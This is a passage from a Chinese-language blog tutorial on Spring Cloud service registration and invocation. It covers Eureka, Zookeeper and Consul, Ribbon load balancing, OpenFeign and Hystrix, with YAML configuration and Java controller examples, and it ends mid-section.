<h4 id="Client-端-服务提供者"><a href="#Client-端-服务提供者" class="headerlink" title="Client 端 - 服务提供者"></a>Client 端 - 服务提供者</h4><p>可以搭建为集群，以保证服务的可靠性。集群时，服务的配置没有区别。</p>
<ul>
<li>引入包</li>
</ul>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">spring-cloud-starter-netflix-eureka-client</span><br></pre></td></tr></table></figure>

<ul>
<li>配置</li>
</ul>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8001</span></span><br><span class="line">  </span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="comment"># 服务提供者 名称</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">provider.client</span></span><br><span class="line">  <span class="attr">datasource:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">...</span></span><br><span class="line">    <span class="attr">driver-class-name:</span> <span class="string">...</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">...</span></span><br><span class="line">    <span class="attr">username:</span> <span class="string">...</span></span><br><span class="line">    <span class="attr">password:</span> <span class="string">...</span></span><br><span class="line">    </span><br><span class="line"><span class="attr">mybatis:</span></span><br><span class="line">  <span class="attr">mapperLocations:</span> <span class="string">classpath:mapper/**/*.xml</span></span><br><span class="line">  <span class="attr">type-aliases-package:</span> <span class="string">coom.example.demo.entites</span></span><br><span class="line">  </span><br><span class="line"><span class="attr">eureka:</span></span><br><span class="line">  <span class="attr">client:</span></span><br><span class="line">    <span class="comment"># 将自己注册到 Server 端</span></span><br><span class="line">    <span class="attr">register-with-eureka:</span> <span class="literal">true</span></span><br><span class="line">    <span class="comment"># 从 Server 端抓取已有的注册信息</span></span><br><span class="line">    <span class="attr">fetch-registry:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">service-url:</span></span><br><span class="line">      <span class="attr">defaultZone:</span> <span class="string">http://localhost:7001/eureka</span></span><br><span class="line">  <span class="attr">instance:</span></span><br><span class="line">    <span class="comment"># 避免使用主机名</span></span><br><span class="line">    <span class="attr">instance-id:</span> <span class="string">provider-8001</span></span><br><span class="line">    <span class="comment"># 显示 IP</span></span><br><span class="line">    <span class="attr">prefer-ip-address:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>

<ul>
<li>提供服务的Controller</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 使用</span></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IndexController</span> &#123;</span><br><span class="line">    <span class="comment">// 提供的服务</span></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">get</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;content&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>启动类配置</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@EnableEurekaClient</span> </span><br></pre></td></tr></table></figure>



<h4 id="Client-端-服务消费者"><a href="#Client-端-服务消费者" class="headerlink" title="Client 端 - 服务消费者"></a>Client 端 - 服务消费者</h4><p>步骤基本同服务提供者。调用的底层采用HttpClient。</p>
<ul>
<li>引入包</li>
</ul>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">spring-cloud-starter-netflix-eureka-client</span><br></pre></td></tr></table></figure>

<ul>
<li>配置</li>
</ul>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8001</span></span><br><span class="line">  </span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="comment"># 服务消费者 名称</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">consumer.client</span></span><br><span class="line"></span><br><span class="line"><span class="attr">eureka:</span></span><br><span class="line">  <span class="attr">client:</span></span><br><span class="line">    <span class="comment"># 可以不必将自己注册到 Server 端</span></span><br><span class="line">    <span class="attr">register-with-eureka:</span> <span class="literal">false</span></span><br><span class="line">    <span class="comment"># 从 Server 端抓取已有的注册信息</span></span><br><span class="line">    <span class="attr">fetch-registry:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">service-url:</span></span><br><span class="line">      <span class="attr">defaultZone:</span> <span class="string">http://localhost:7001/eureka</span></span><br></pre></td></tr></table></figure>

<ul>
<li>启动类配置</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@EnableEurekaClient</span></span><br></pre></td></tr></table></figure>

<p>服务地址改为服务名称</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 配置类</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RestTemplateConfig</span> &#123;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="meta">@LoadBalanced</span>  <span class="comment">// 默认是轮询</span></span><br><span class="line">    <span class="keyword">public</span> RestTemplate <span class="title function_">restTemplate</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">RestTemplate</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IndexController</span> &#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> RestTemplate restTemplate;</span><br><span class="line">    <span class="meta">@GetMapping(&quot;/&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">get</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> restTemplate.getForObject(<span class="string">&quot;http://provider.client&quot;</span>, String.class);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="Server-集群"><a href="#Server-集群" class="headerlink" title="Server 集群"></a>Server 集群</h4><p>服务器之间相互注册，都保存了其他服务器的实例。</p>
<ul>
<li><p>新建多个Server模块，配置端口号为7001，7002，7003。</p>
</li>
<li><p>配置，例如7001</p>
</li>
</ul>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">7001</span></span><br><span class="line"></span><br><span class="line"><span class="attr">eureka:</span></span><br><span class="line">  <span class="attr">instance:</span></span><br><span class="line">    <span class="attr">hostname:</span> <span class="string">a.server</span></span><br><span class="line">  <span class="attr">client:</span></span><br><span class="line">    <span class="comment"># 不向注册中心注册自己</span></span><br><span class="line">    <span class="attr">register-with-eureka:</span> <span class="literal">false</span></span><br><span class="line">    <span class="comment"># 不需要检索服务，因为自己是注册中心</span></span><br><span class="line">    <span class="attr">fetch-registry:</span> <span class="literal">false</span></span><br><span class="line">    <span class="attr">service-url:</span></span><br><span class="line">      <span class="comment"># 注册到其他服务中</span></span><br><span class="line">      <span class="attr">defaultZone:</span> <span class="string">http://b.server:7002/eureka/,</span> <span class="string">http://c.server:7003/eureka/</span></span><br></pre></td></tr></table></figure>

<p>此时Client端只需修改</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">defaultZone:</span> <span class="string">http://a.server:7001/eureka/,</span> <span class="string">http://b.server:7002/eureka/,</span> <span class="string">http://c.server:7003/eureka/</span></span><br></pre></td></tr></table></figure>



<h4 id="服务发现"><a href="#服务发现" class="headerlink" title="服务发现"></a>服务发现</h4><ul>
<li>提供服务的Controller</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 使用</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IndexController</span> &#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> DiscoveryClient discoveryClient;</span><br><span class="line">    <span class="meta">@GetMapping(&quot;/services&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">services</span><span class="params">()</span> &#123;</span><br><span class="line">        List&lt;String&gt; services = discoveryClient.getServices();</span><br><span class="line">        <span class="comment">// 或</span></span><br><span class="line">        discoveryClient.getInstances(<span class="string">&quot;provider.client&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.discoveryClient;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>启动类配置</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@EnableEurekaClient</span>  <span class="comment">// 以后可以省了</span></span><br><span class="line"><span class="meta">@EnableDiscoveryClient</span>  <span class="comment">// 一定会用</span></span><br></pre></td></tr></table></figure>

<h4 id="自我保护机制"><a href="#自我保护机制" class="headerlink" title="自我保护机制"></a>自我保护机制</h4><p>一定时间内没有收到心跳包，也不会注销微服务。</p>
<p>如果关闭，则配置 Server 端</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">eureka:</span></span><br><span class="line">  <span class="attr">server:</span></span><br><span class="line">    <span class="attr">enable-self-preservation:</span> <span class="literal">false</span></span><br><span class="line">    <span class="attr">eviction-interval-timer-in-ms:</span> <span class="number">2000</span></span><br></pre></td></tr></table></figure>

<p>Client 端 - 服务提供者</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">eureka:</span></span><br><span class="line">  <span class="attr">instance:</span></span><br><span class="line">    <span class="comment"># 发送心跳的间隔，默认是30秒</span></span><br><span class="line">    <span class="attr">lease-renewal-interval-in-seconds:</span> <span class="number">1</span> </span><br><span class="line">    <span class="comment"># 最后一次心态等待时间上限，超时剔除服务，默认90秒</span></span><br><span class="line">    <span class="attr">lease-expiration-duration-in-seconds:</span> <span class="number">2</span></span><br></pre></td></tr></table></figure>

<h3 id="Zookeeper-1"><a href="#Zookeeper-1" class="headerlink" title="Zookeeper"></a>Zookeeper</h3><h4 id="Server-端-1"><a href="#Server-端-1" class="headerlink" title="Server 端"></a>Server 端</h4><p>需要自行搭建。</p>
<p>命令行客户端</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看服务节点的服务</span></span><br><span class="line"><span class="built_in">ls</span> /services/provider.client</span><br></pre></td></tr></table></figure>



<h4 id="Client-端-服务提供者-1"><a href="#Client-端-服务提供者-1" class="headerlink" title="Client 端 - 服务提供者"></a>Client 端 - 服务提供者</h4><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">spring-cloud-starter-zookeeper-discovery</span><br><span class="line">配置版本与服务端相同</span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.zookeeper<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-zookeeper-discovery<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">exclusions</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.zookeeper<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>zookeeper<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">exclusions</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.zookeeper<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>zookeeper<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>...<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>配置</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8004</span></span><br><span class="line"></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">provider.client</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">zookeeper:</span></span><br><span class="line">      <span class="attr">connect-string:</span> <span class="string">zookeeper_ip:port</span></span><br></pre></td></tr></table></figure>

<p>启动类设置</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@EnableDiscoveryClient</span></span><br></pre></td></tr></table></figure>

<p>编写Controller</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IndexController</span> &#123;</span><br><span class="line">    <span class="comment">// 提供的服务</span></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">get</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;content&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>服务节点有临时节点和持久节点。如果服务挂掉，就会清除服务，之后再重新注册。</p>
<h4 id="Clien-端-服务消费者"><a href="#Clien-端-服务消费者" class="headerlink" title="Clien 端 - 服务消费者"></a>Clien 端 - 服务消费者</h4><p>基本过程和服务提供者相同。</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8004</span></span><br><span class="line"></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">consumer.client</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">zookeeper:</span></span><br><span class="line">      <span class="attr">connect-string:</span> <span class="string">zookeeper_ip:port</span></span><br></pre></td></tr></table></figure>

<p>配置启动类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@EnableDiscoveryClient</span></span><br></pre></td></tr></table></figure>

<p>配置业务类，访问服务接口</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 配置类</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RestTemplateConfig</span> &#123;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="meta">@LoadBalanced</span>  <span class="comment">// 默认是轮询</span></span><br><span class="line">    <span class="keyword">public</span> RestTemplate <span class="title function_">restTemplate</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">RestTemplate</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IndexController</span> &#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> RestTemplate restTemplate;</span><br><span class="line">    <span class="meta">@GetMapping(&quot;/&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">get</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> restTemplate.getForObject(<span class="string">&quot;http://provider.client/&quot;</span>, String.class);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="Consul"><a href="#Consul" class="headerlink" title="Consul"></a>Consul</h3><p>有可视化工具。</p>
<h4 id="Server-端-2"><a href="#Server-端-2" class="headerlink" title="Server 端"></a>Server 端</h4><p>启动</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">consul.exe</span><br><span class="line"><span class="comment"># 默认在 http://lcoalhost:8500</span></span><br></pre></td></tr></table></figure>

<h4 id="Client-端-服务提供者-2"><a href="#Client-端-服务提供者-2" class="headerlink" title="Client 端 - 服务提供者"></a>Client 端 - 服务提供者</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">spring-cloud-starter-consul-discovery</span><br></pre></td></tr></table></figure>

<p>配置</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8006</span></span><br><span class="line"></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">provider.client</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">consul:</span></span><br><span class="line">      <span class="attr">host:</span> <span class="string">localhost</span></span><br><span class="line">      <span class="attr">port:</span> <span class="number">8500</span></span><br><span class="line">      <span class="attr">discovery:</span></span><br><span class="line">        <span class="attr">service-name:</span> <span class="string">$&#123;spring.application.name&#125;</span></span><br></pre></td></tr></table></figure>

<p>启动类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@EnableDiscoveryClient</span></span><br></pre></td></tr></table></figure>

<p>提供服务</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IndexController</span> &#123;</span><br><span class="line">    <span class="comment">// 提供的服务</span></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">get</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;content&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h4 id="Client-端-服务消费者-1"><a href="#Client-端-服务消费者-1" class="headerlink" title="Client 端 - 服务消费者"></a>Client 端 - 服务消费者</h4><p>配置</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8006</span></span><br><span class="line"></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">consumer.client</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">consul:</span></span><br><span class="line">      <span class="attr">host:</span> <span class="string">localhost</span></span><br><span class="line">      <span class="attr">port:</span> <span class="number">8500</span></span><br><span class="line">      <span class="attr">discovery:</span></span><br><span class="line">        <span class="attr">service-name:</span> <span class="string">$&#123;spring.application.name&#125;</span></span><br></pre></td></tr></table></figure>

<p>启动类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@EnableDiscoveryClient</span></span><br></pre></td></tr></table></figure>

<p>获取服务</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 配置类</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RestTemplateConfig</span> &#123;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="meta">@LoadBalanced</span>  <span class="comment">// 默认是轮询</span></span><br><span class="line">    <span class="keyword">public</span> RestTemplate <span class="title function_">restTemplate</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">RestTemplate</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IndexController</span> &#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> RestTemplate restTemplate;</span><br><span class="line">    <span class="meta">@GetMapping(&quot;/&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">get</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> restTemplate.getForObject(<span class="string">&quot;http://provider.client/&quot;</span>, String.class);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="服务调用"><a href="#服务调用" class="headerlink" title="服务调用"></a>服务调用</h2><h3 id="Ribbon"><a href="#Ribbon" class="headerlink" title="Ribbon"></a>Ribbon</h3><p>主要是客户端用来负载均衡，服务调用的。</p>
<p>现在已经进入维护模式了。</p>
<p>与Nginx区别：</p>
<ul>
<li>Nginx 是服务端的，集中式的负载均衡</li>
<li>Ribbon 是本地的，进程内的负载均衡</li>
</ul>
<p>可以和多个注册中心结合使用。例如和Eureka。</p>
<p>默认情况下，Eureka自带Ribbon，因此此时不比引入。</p>
<p>也是基于<code>restTemplate</code>使用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 基本就是 Json</span></span><br><span class="line">restTemplate.getForObject</span><br><span class="line"><span class="comment">// 还包含响应头，响应体等</span></span><br><span class="line">restTemplate.getForEntity</span><br><span class="line"><span class="comment">// 因此还可以获取请求体</span></span><br><span class="line">getForEntity().getBody()</span><br></pre></td></tr></table></figure>

<p>选择策略<code>IRule</code>，自带7种，可以扩展：</p>
<ul>
<li><code>RoundRobinRule</code> - 轮询</li>
<li><code>RandomRule</code> - 随机</li>
<li><code>RetryRule</code> - 轮询，访问速度块的权重越大</li>
<li><code>WeightedResponseTimeRule</code> - 先轮询，如果访问失败则重试</li>
<li><code>BestAvailableRule</code> - 先过滤故障节点，再选择并发量最小的服务</li>
<li><code>AvailabilityFilteringRule</code> - 过滤故障实例，再选择并发小的实例</li>
<li><code>ZoneAvoidanceRule</code> - 复合判断Server的性能和可用性</li>
</ul>
<p>为了不让配置类在整个应用下其效果，应该将配置类放在应用外面。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MySelfRule</span>&#123;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> IRule <span class="title function_">myRule</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">RandomRule</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>主启动类添加</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RibbonClient(name=&quot;被访问的服务&quot;, cinfiguration=MySelfRule.class)</span></span><br></pre></td></tr></table></figure>

<h3 id="OpenFeign"><a href="#OpenFeign" class="headerlink" title="OpenFeign"></a>OpenFeign</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">spring-cloud-starter-openfeign</span><br></pre></td></tr></table></figure>

<p>主启动类启动</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@EnableFeignClients</span></span><br></pre></td></tr></table></figure>

<p>创建服务</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="meta">@FeignClient(value=&quot;服务名&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">FeignService</span> &#123;</span><br><span class="line">    <span class="meta">@GetMapping(value=&quot;/url&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">create</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>创建调用者</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IndexController</span> &#123;</span><br><span class="line">    <span class="meta">@Autowired</span> </span><br><span class="line">    <span class="keyword">private</span> FeignService feignService;</span><br><span class="line">    <span class="meta">@GetMapping(&quot;/&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">index</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> feignService.create();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>配置中超时时间</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 默认等待服务提供者 1 秒</span></span><br><span class="line"><span class="attr">ribbon:</span></span><br><span class="line">  <span class="attr">ReadTimeout:</span> <span class="number">5000</span></span><br><span class="line">  <span class="attr">ConnectTimeout:</span> <span class="number">5000</span></span><br></pre></td></tr></table></figure>

<p>配置日志</p>
<ul>
<li>NONE</li>
<li>BASIC</li>
<li>HEADERS</li>
<li>FULL</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FeignConfig</span> &#123;</span><br><span class="line">    <span class="meta">@Bean</span> </span><br><span class="line">    Logger.Level <span class="title function_">feginLoggerLevel</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Logger.Level.FULL</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">logging:</span></span><br><span class="line">  <span class="attr">level:</span></span><br><span class="line">    <span class="attr">com.example.springcloud.service.FeignService:</span> <span class="string">debug</span></span><br></pre></td></tr></table></figure>

<h2 id="服务降级"><a href="#服务降级" class="headerlink" title="服务降级"></a>服务降级</h2><p>当服务单元故障时，断路器给服务调用方返回一个符合预期的备选响应（Fallback），而不是无限等待。</p>
<ul>
<li>服务降级：Fallback - 提供兜底方案。</li>
<li>服务熔断：Break - 直接拒绝访问，再调用服务降级。当降级次数过多，就触发熔断，也就是直接调用fallback。等到服务正常后再恢复调用链。</li>
<li>服务限流：Flowlimit - 限制高并发，要排队</li>
</ul>
<h3 id="Hystrix"><a href="#Hystrix" class="headerlink" title="Hystrix"></a>Hystrix</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">spring-cloud-starter-netflix-hystrix</span><br></pre></td></tr></table></figure>

<p>可以用在服务侧，也可以用在消费侧。一般都用在消费侧。可以使用<code>Jmeter</code>压测。</p>
<p>构建一个带熔断的服务方</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainService</span> &#123;</span><br><span class="line">    <span class="meta">@HystrixCommand(fallbackMethod=&quot;createHandler&quot;, commandProperties=&#123;</span></span><br><span class="line"><span class="meta">        // 新增的触发熔断的条件。（新增一种超时异常）</span></span><br><span class="line"><span class="meta">        @HystrixProperty(name=&quot;exception.isolation.thread.timeoutInMilliseconds&quot;, value=&quot;3000&quot;)</span></span><br><span class="line"><span class="meta">    &#125;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">create</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">createHandler</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;500&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>主启动类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@EnableCircuitBreaker</span></span><br></pre></td></tr></table></figure>

<p>或构建一个带熔断的消费者</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">feign:</span></span><br><span class="line">  <span class="attr">hystrix:</span></span><br><span class="line">    <span class="attr">enabled:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>

<p>编辑服务调用接口</p>
